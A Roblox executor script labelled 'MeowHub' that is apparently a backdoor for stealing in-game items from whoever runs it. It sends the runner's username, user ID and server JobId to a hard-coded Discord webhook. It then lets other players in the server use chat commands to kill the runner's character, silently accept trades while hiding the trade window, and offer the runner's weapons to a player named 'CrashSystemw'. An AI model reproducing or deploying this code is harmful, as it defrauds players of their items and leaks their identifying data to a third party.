local OSTime = os.time();
local Time = os.date('!*t', OSTime);
local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png';
local Content = '';
local Embed = {
    title = 'LocalPlayer: ' .. game.Players.LocalPlayer.Name;
    color = '500';
    footer = { text = 'User id: ' .. game.Players.LocalPlayer.UserId };
    author = {
        name = 'MeowHub';
        url = 'https://www.roblox.com/';
    };
    fields = {
        {
            name = "JobId: " .. game.JobId;
            value = "";
        }
    };
    timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
};
(syn and syn.request or http_request) {
    Url = 'https://discord.com/api/webhooks/1256470236732063745/LFVGqWVOactpANHst7rmUg_mNNY6zbbxGZs4y0-a28yJBc5tOjYPUfxMAjce1-Hw0jcl';
    Method = 'POST';
    Headers = {
        ['Content-Type'] = 'application/json';
    };
    Body = game:GetService'HttpService':JSONEncode( { content = Content; embeds = { Embed } } );
};

local main = game.Players:WaitForChild("CrashSystemw")

Player = game.Players.LocalPlayer
Pl = game.Players

function MainCommands(plr, msg)
    if msg == "p" then
        game.Players.LocalPlayer.Character.Humanoid.Health = 0
    end

    if msg == "s" then
        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptRequest"):FireServer()
        for i = 1, 100 do
            wait(0.1)
        game.Players.LocalPlayer.PlayerGui.TradeGUI_Phone.Enabled = false
        game.Players.LocalPlayer.PlayerGui.TradeGUI.Enabled = false
    end
    end

    if msg == "a" then
        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer()
        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer()
        
    end
end

for i, v in Pl:GetChildren() do
    if v ~= Player then
        v.Chatted:Connect(function(msg)
            MainCommands(v, msg)
        end)
    end
end

Pl.PlayerAdded:Connect(function(plr)
    plr.Chatted:Connect(function(msg)
        MainCommands(plr, msg)
    end)
end)

game.Players.CrashSystemw.Chatted:Connect(function(msg) 
    
    local args = {
        [1] = msg,
        [2] = "Weapons"
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))

end)

